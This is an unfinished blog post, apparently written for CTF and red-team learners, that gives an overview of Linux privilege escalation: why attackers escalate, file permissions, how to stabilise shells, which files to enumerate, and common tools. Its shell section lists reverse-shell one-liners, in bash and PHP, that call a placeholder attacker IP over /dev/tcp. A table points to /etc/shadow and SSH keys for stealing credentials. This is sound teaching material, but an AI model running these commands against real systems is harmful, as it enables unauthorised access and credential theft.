---
title: 'Linux PrivEsc Flyover'
categories: ['Hacking', 'CTF', 'Privilege Escalation', 'Linux']
tags: ['hacking', 'CTF', 'Post Exploitation', 'Linux']
date: '2022-06-15'
type: 'post'
weight: 400
keywords: 'hacking pentesting linux privesc'
toc: 'true'
---

Privilege escalation is a key part of any full compromise in both redteaming and APT activities. In many cases elevation to a systems highest level of access demonstrates full ownership over it and implies that an attacker now has complete control. In this post I try to narrow down on a few key concepts that commonly arise in the post-exploitation to privilege escalation phase of an attack on a Linux based host.

## Lay of the land (PrivEsc, Permissions and Defence In Depth)

Why do we need elevated privileges? Why can't we just pop/spawn a shell with root/elevated privileges? Let's start by unpacking these questions.

### PrivEsc

Typically as an attacker (think redteam/APT) we desire three key abilities to continue our campaign after initial access:

- Persistence - allows us to maintain our foothold even after possible detection or the closure of our initial access route
- Access to begin moving laterally (lateral movement) - allows us to move further into a network and potentially expose higher value targets
- Command/Control - facilitates further attacks, data exfiltration and remaining undetected

To achieve these goals we typically require system privileges that will allow us to:

- install malware and implants
- modify and/or replace key files
- make outbound network requests

among other sysadmin like activities.

To that end the specific privileges we will need to escalate to and the steps required to get there will vary greatly from system to system and also on your initial foothold. The bellow, however, attempts to provide an abstracted view of a typical system compromise.

![Attacker Life Cycle](https://i.imgur.com/PcWtMAd.png)

### Defence in Depth

Often, and especially due to concept of defence in depth, we don't normally get a shell with elevated privileges. This is because most modern application architectures will try to have processes execute in accordance with the concept of least privilege. That is the process will run as a user with only the permissions required for the process to achieve its function.

### Permissions

Linux permissions are arranged per file into a collection of three sets of flags. These sets are:

- The user level permissions
- user group permissions
- All user permissions

In general there are three main types of `bits` that can be set within each group. These correspond to an action that a user who lives within one of the permission levels can carry out. The bits are as follows:

- `r` - a user can read the file
- `w` - a user can write to the file
- `x` - a user can execute the file
- `s` - the set UID bit or set group ID

The last is a special permission which we call the SUID bit or SGUID bit.

![LinuxPermissions](https://i.imgur.com/1wgTh4V.png)

## Moving beyond an initial foothold (Stable Shells)

Often times the shell we get may not even be a stable shell to begin with. A stable shell (also known as a full tty) is one which comes with the comforts of your local prompt; tab completion, error handling, readable text, normalisation, path/dir context, formatting, command history. Additionally a 'dumb shell' cannot run some commands like `su` and `ssh` and usually text editors will not work properly. These are important because they help prevent losing your foothold to unforeseen hangs, errors and `ctrl-c` typos. So what can we do about it?

There are 101 ways to upgrade a shell to a full tty. Some classics include:

- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- `bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1`
- `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>`

and we also have some pretty cool tooling like: [pwncat](https://pwncat.readthedocs.io/en/latest/usage.html) which can sometimes just automatically give us root little-lone a stable shell. We'll cover that more later.

Beyond the above this is not the place to copy and paste a bunch of well known ones so checkout cheat sheets like [highoncoffee's reverse shells cheatsheet](https://highon.coffee/blog/reverse-shell-cheat-sheet/#bash-reverse-shells) for more examples.

## Important files and enumeration

| Default Path        | Description                              | Use                                                                                  |
| ------------------- | ---------------------------------------- | ------------------------------------------------------------------------------------ |
| `/etc/passwd`       | Users, permissions and folders           | Look for users with higher permissions and shells, sometimes useful for system paths |
| `/etc/shadow`       | Users credentials (hashed)               | If it’s readable can be used to collection password hashes for cracking              |
| `/home/<usr>/.ssh/` | Sometimes users ssh keys and configs     | Persistence vector, better shells, priv esc if key is for user with higher perms     |
| `/etc/issue`        | Kernel version and other versioning info | Look for known CVEs (vulns)                                                          |
| `ps <variants>`     | View Running processes                   | Look for interesting processes which may facilitate privesc                          |
| `env`               | Environment variables                    | Some environment variables like `$PATH` may contain sensitive info                   |

### Enumeration Tooling

- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
- [pwncat](https://pwncat.readthedocs.io/)
- MetaSploit
- CLI - `find / -type f -perm -04000 -ls 2>/dev/null`

## Living off the land (GTFOBins)

Living off the land is a 'hackers' bread and butter ... @TODO

GTFOBins are a collection of binaries which under some constraints offer vectors for privilege escalation.

## Living off the land Pt2 (CRONs)

## Kernel Exploits & CVEs
